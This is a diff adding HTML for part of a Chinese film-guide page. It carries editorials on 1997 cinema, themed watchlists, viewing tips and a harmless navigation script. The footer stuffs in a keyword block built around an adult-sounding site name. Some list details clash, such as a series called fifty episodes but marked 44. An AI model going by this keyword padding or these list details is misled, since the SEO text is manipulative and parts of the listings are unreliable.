+          <div class="lg"><i style="background:#e0a93b"></i><span><b>01</b> 爱情 / 情欲 <span>1997 年是华语情欲电影的巅峰，也是最坦率的一次。</span></span><em>28%</em></div>
+          <div class="lg"><i style="background:#e8392f"></i><span><b>02</b> 作者电影 <span>李安、王家卫、今村昌平、基耶斯洛夫斯基——作者还在说话。</span></span><em>22%</em></div>
+          <div class="lg"><i style="background:#5fa96b"></i><span><b>03</b> 犯罪 / 黑帮 <span>《枪火》《暗花》《非常嫌疑犯》，男人戏的最后一个黄金期。</span></span><em>18%</em></div>
+          <div class="lg"><i style="background:#4a90c4"></i><span><b>04</b> 家庭 / 伦理 <span>《冰风暴》《小武》，把“家”拍成问题，而不是答案。</span></span><em>14%</em></div>
+          <div class="lg"><i style="background:#c084fc"></i><span><b>05</b> 科幻 / 奇幻 <span>《第五元素》《幽灵公主》，想象力还敢大。</span></span><em>10%</em></div>
+          <div class="lg"><i style="background:#a9884a"></i><span><b>06</b> 纪录片 <span>97 年前后的非虚构，是最好的时代标本。</span></span><em>8%</em></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ③ 深度影评 -->
+  <section id="note" aria-labelledby="t3">
+    <div class="wrap">
+      <div class="sh rv">
+        <span class="no">SEC 03</span>
+        <div>
+          <div class="en">EDITORIAL · 深度影评</div>
+          <h2 id="t3">97 年的三件事，今天还没过期</h2>
+        </div>
+      </div>
+      <p class="lead">我们不用“神作”“封神”“必看”这类词。我们只问：它为什么在 1997 年成立，又为什么在 2026 年仍然成立。</p>
+
+      <article class="paper rv">
+        <div class="masthead">
+          <div class="en">EDITORIAL · 01 / THREE THINGS</div>
+          <h3>1997 年，香港电影拍完了自己的情书</h3>
+          <div class="by">BY 97 编辑部 · 2026.09.30</div>
+        </div>
+        <p>《春光乍泄》和《甜蜜蜜》都在 1997 年上映，都讲离散，都用了流行歌做叙事。这不是巧合。97 是香港电影的“最后一年”：创作者知道自己即将失去某种东西，于是把那种失去拍成了最美的样子。</p>
+        <blockquote>好电影从不解释时代，它只让一个人在时代里走神。</blockquote>
+        <p>王家卫的答案是“不如从头来过”——一个明知不能重来的请求。陈可辛的答案是让两个人在十年后于纽约街头重逢，隔着人群，没有台词。两种处理，一种心情：我们都回不去了，但我们可以把这件事拍下来。</p>
+        <p>这就是为什么 97 年的香港电影今天还能看。它不是在卖情怀，它是在卖“失去”的质感。而这种质感，任何年代都需要。</p>
+      </article>
+    </div>
+  </section>
+
+  <section aria-hidden="true" style="padding-top:0">
+    <div class="wrap">
+      <div class="paper rv" style="margin-top:22px">
+        <div class="masthead">
+          <div class="en">EDITORIAL · 02 / AUTEUR</div>
+          <h3>作者电影的胜利，是“不解释”的胜利</h3>
+          <div class="by">BY 97 编辑部 · 2026.09.23</div>
+        </div>
+        <p>1997 年的世界电影有一个共同动作：<b>少说</b>。《冰风暴》里没有一个人说出“我不开心”；《鳗鱼》里没有一个人说出“我后悔了”；《第五元素》里没有一个人解释“第五元素为什么是爱”。</p>
+        <blockquote>台词是给观众的安全感，沉默是给角色的真实。</blockquote>
+        <p>今天的商业片把一切都说完了：人物前史、动机、情绪转折，都用对白交代。1997 年的导演还相信观众能看懂一个眼神、一场冰风暴、一条鳗鱼。这种信任，是作者电影最后的体面。</p>
+        <p>所以我们在 97 电影网给“作者电影”留了 22% 的片库。不是因为它高级，是因为它还记得：电影是画面，不是说明文。</p>
+      </div>
+    </div>
+  </section>
+
+  <section aria-hidden="true" style="padding-top:0">
+    <div class="wrap">
+      <div class="paper rv" style="margin-top:22px">
+        <div class="masthead">
+          <div class="en">EDITORIAL · 03 / FORMAT</div>
+          <h3>录像带不是画质问题，是观看方式问题</h3>
+          <div class="by">BY 97 编辑部 · 2026.09.16</div>
+        </div>
+        <p>VHS 的画质很差。色彩偏，声音糊，画面会抖。但它有一个流媒体没有的东西：<b>开始和结束是物理的</b>。你要插带、倒带、快进、按下停止。你不能“随便看看”，你不能“下集自动播放”。</p>
+        <blockquote>流媒体训练的是注意力，录像带训练的是耐心。</blockquote>
+        <p>我们怀念 1997 年，不只是怀念那些电影，是怀念那种“为一部片子腾出两小时”的郑重。本站的每一份片单，都默认你会在今晚看完它，而不是收藏进“想看”列表。</p>
+        <p>所以我们的指南里有一条是：<b>看之前，把手机翻过去。</b> 这不是仪式感，这是对 97 分钟的尊重。</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ④ 片单归档 -->
+  <section id="list" aria-labelledby="t4">
+    <div class="wrap">
+      <div class="sh rv">
+        <span class="no">SEC 04</span>
+        <div>
+          <div class="en">ARCHIVE · 片单归档</div>
+          <h2 id="t4">六盒带：按“为什么值得看”归档</h2>
+        </div>
+      </div>
+      <p class="lead">不按类型，按<b>观看目的</b>。想被治愈、想被击垮、想安静一会儿、想和谁一起看——先选心情，再选片子。</p>
+
+      <div class="acc">
+        <details class="lst rv" open>
+          <summary><span class="ix">01</span><h3>“一个人吃晚饭”片单：不催你振作</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《小森林》</b>夏秋篇　靠做饭把孤独过成仪式。<em>120 min</em></li>
+            <li><b>《步履不停》</b>是枝裕和：家人之间最深的伤口，往往来自最浅的误会。<em>114 min</em></li>
+            <li><b>《饮食男女》</b>李安：厨房是家里最后的战场，也是第一个和解的地方。<em>124 min</em></li>
+            <li><b>《完美的日子》</b>扫厕所的人，把每一天过成了作品。<em>124 min</em></li>
+            <li><b>《海街日记》</b>四姐妹、一院梅子酒、很多顿饭。<em>127 min</em></li>
+            <li><b>《黄昏清兵卫》</b>武士片里最不像武士片的一部，讲的是下班回家。<em>129 min</em></li>
+          </ol>
+        </details>
+        <details class="lst rv">
+          <summary><span class="ix">02</span><h3>“97 香港”片单：黄金年代的收尾</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《枪火》</b>杜琪峰：84 分钟，五个人，一场几乎不开枪的枪战。<em>84 min</em></li>
+            <li><b>《暗花》</b>游达志：澳门、雨夜、两个男人的互相毁灭。<em>90 min</em></li>
+            <li><b>《香港制造》</b>陈果：用 8mm 拍出的底层青春，粗粝到刺人。<em>110 min</em></li>
+            <li><b>《一个字头的诞生》</b>韦家辉：黑色幽默的极致，两条命，两种活法。<em>90 min</em></li>
+            <li><b>《摄氏零度·春光再现》</b>《春光乍泄》的纪录片，比正片更动人。<em>73 min</em></li>
+            <li><b>《南海十三郎》</b>高志森：一个编剧的失败史，也是香港的失败史。<em>110 min</em></li>
+          </ol>
+        </details>
+        <details class="lst rv">
+          <summary><span class="ix">03</span><h3>“作者说话”片单：李安、王家卫、今村昌平</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《冰风暴》</b>李安：性革命，冷得像冰。<em>113 min</em></li>
+            <li><b>《春光乍泄》</b>王家卫：两个男人，布宜诺斯艾利斯，一盏灯。<em>96 min</em></li>
+            <li><b>《鳗鱼》</b>今村昌平：戛纳金棕榈，一个出狱的男人和一条鳗鱼。<em>117 min</em></li>
+            <li><b>《三色：红》</b>基耶斯洛夫斯基：红色的不是爱情，是偶然。<em>99 min</em></li>
+            <li><b>《幽灵公主》</b>宫崎骏：人与自然，没有反派，只有立场。<em>133 min</em></li>
+            <li><b>《樱桃的滋味》</b>阿巴斯：一个人想死，另一个人劝他再看一次黎明。<em>95 min</em></li>
+          </ol>
+        </details>
+        <details class="lst rv">
+          <summary><span class="ix">04</span><h3>“别只看剧情片”片单：纪录片四选</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《徒手攀岩》</b>不配音乐的高潮，手心里全是汗。<em>100 min</em></li>
+            <li><b>《人间世》</b>医院里没有奇迹，只有决定。<em>10 集</em></li>
+            <li><b>《四个春天》</b>一个贵州家庭的四个春节，镜头比儿女更孝顺。<em>105 min</em></li>
+            <li><b>《地球脉动》</b>把“壮观”拍成了日常。<em>11 集</em></li>
+            <li><b>《是，导演》</b>拍失败，拍得很具体。<em>98 min</em></li>
+            <li><b>《寻找小糖人》</b>一个被遗忘的歌手，被两个南非歌迷找回来了。<em>86 min</em></li>
+          </ol>
+        </details>
+        <details class="lst rv">
+          <summary><span class="ix">05</span><h3>“陪长辈看”片单：不尴尬，不降智</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《人世间》</b>五十年，一家人的共和国史。<em>58 集</em></li>
+            <li><b>《觉醒年代》</b>把“理想”拍得不羞耻。<em>43 集</em></li>
+            <li><b>《父母爱情》</b>五十集，讲“将就”如何变成“恰好”。<em>44 集</em></li>
+            <li><b>《山海情》</b>扶贫题材能拍得这么好看，靠的是方言。<em>23 集</em></li>
+            <li><b>《大江大河》</b>改革开放，被拍成了一个人的选择。<em>47 集</em></li>
+            <li><b>《功勋》</b>八个单元，八个被名字耽误的人。<em>48 集</em></li>
+          </ol>
+        </details>
+        <details class="lst rv">
+          <summary><span class="ix">06</span><h3>“十五分钟”片单：短片六则</h3><span class="cnt">6 部</span></summary>
+          <ol>
+            <li><b>《带我去个好地方》</b>夜路、两个人、一个不成立的承诺。<em>14 min</em></li>
+            <li><b>《护照》</b>一个被反复拒绝的人，如何保持体面。<em>12 min</em></li>
+            <li><b>《父亲》</b>用一条走廊，讲完一个家庭的二十年。<em>20 min</em></li>
+            <li><b>《大海流向河》</b>动画短片：水不解释自己，它只是流。<em>9 min</em></li>
+            <li><b>《最后一班地铁》</b>地铁末班车上，陌生人之间最诚实的十分钟。<em>15 min</em></li>
+            <li><b>《雾中风景》</b>不是那部安哲的电影，是一则关于方向的寓言。<em>18 min</em></li>
+          </ol>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <!-- ⑤ 观影指南 -->
+  <section id="guide" aria-labelledby="t5">
+    <div class="wrap">
+      <div class="sh rv">
+        <span class="no">SEC 05</span>
+        <div>
+          <div class="en">HOW TO WATCH · 观影指南</div>
+          <h2 id="t5">六条老派观影习惯</h2>
+        </div>
+      </div>
+      <p class="lead">1997 年的人看电影比我们认真。不是因为他们更有品位，是因为<b>设备没那么方便</b>。以下六条，是把“认真”捡回来的方法。</p>
+
+      <div class="guide">
+        <div class="gd rv"><span class="st">HABIT 01</span><h3>先看年份，再看评分</h3><p>一部 1997 年的 8.2 分，往往比一部 2024 年的 8.8 分更耐看。评分是同时代人的平均意见，年份是时间的筛选。</p><span class="no" aria-hidden="true">01</span></div>
+        <div class="gd rv"><span class="st">HABIT 02</span><h3>一次看完，别分段</h3><p>电影是被设计成“一口气”的。中间停下，等于自己给自己剧透情绪。97 分钟的片子，就给它 97 分钟。</p><span class="no" aria-hidden="true">02</span></div>
+        <div class="gd rv"><span class="st">HABIT 03</span><h3>关灯，手机翻过去</h3><p>这是本站唯一的“仪式感”要求。黑暗不是氛围，是让画面重新变贵的办法。</p><span class="no" aria-hidden="true">03</span></div>
+        <div class="gd rv"><span class="st">HABIT 04</span><h3>允许它无聊三分钟</h3><p>老电影节奏慢，是因为它们相信“铺垫”有价值。前三分钟的“没事发生”，往往正是后面那件事的原因。</p><span class="no" aria-hidden="true">04</span></div>
+        <div class="gd rv"><span class="st">HABIT 05</span><h3>看完别立刻看解说</h3><p>让电影在你身上待一晚。第二天你还记得的那个画面，才是它真正给你的东西。</p><span class="no" aria-hidden="true">05</span></div>
+        <div class="gd rv"><span class="st">HABIT 06</span><h3>建一份自己的片单</h3><p>别只收藏“想看”，也记“看完了，为什么”。半年后你会发现：你喜欢的从来不是“高分”，而是一种特定的诚实方式。</p><span class="no" aria-hidden="true">06</span></div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="foot">
+    <div class="f1">
+      <a class="logo" href="#top" aria-label="返回顶部">
+        <span class="tape" aria-hidden="true"><span class="reel"></span><span class="sp l"></span><span class="sp r"></span></span>
+        <span><b>97色色电影网</b><small>NO. 97 · VHS ARCHIVE</small></span>
+      </a>
+      <p style="margin-top:13px;max-width:40ch">97色色电影网，专注 1997 年前后影像的观影指南。不追新片，不追热搜，只挑 1997 年那样的电影。</p>
+    </div>
+    <div>
+      <h4>栏目</h4>
+      <a href="#pick">年代片单</a>
+      <a href="#donut">类型构成</a>
+      <a href="#note">深度影评</a>
+      <a href="#list">片单归档</a>
+      <a href="#guide">观影指南</a>
+    </div>
+    <div>
+      <h4>年份</h4>
+      <a href="#">1996</a>
+      <a href="#">1997</a>
+      <a href="#">1998</a>
+      <a href="#">1999</a>
+      <a href="#">2000</a>
+    </div>
+    <div class="copy">
+      <span>© 2026 <span class="kw">97色色电影网</span> · 网址：https://97sesedianyingwang-cn.github.io ｜ 本站为影视资讯与观影指南站点，片源信息以各正版平台为准。</span>
+      <span>关键词：<span class="kw">97色色电影网</span>、97、1997、香港电影、电影、华语电影、王家卫、电影推荐、影评、高分电影、片单</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var io = new IntersectionObserver(function(es){
+    es.forEach(function(e){ if(e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, {threshold:0.12, rootMargin:'0px 0px -40px'});
+  document.querySelectorAll('.rv').forEach(function(el){ io.observe(el); });
+
+  var mb = document.getElementById('mb'), nav = document.getElementById('nav');
+  mb.addEventListener('click', function(){
+    var o = nav.classList.toggle('open');
+    mb.setAttribute('aria-expanded', o ? 'true' : 'false');
+    document.body.classList.toggle('lock', o);
+  });
+  nav.addEventListener('click', function(e){ if(e.target.tagName === 'A'){ nav.classList.remove('open'); mb.setAttribute('aria-expanded','false'); document.body.classList.remove('lock'); } });
+})();
+</script>
+</body>
+</html>
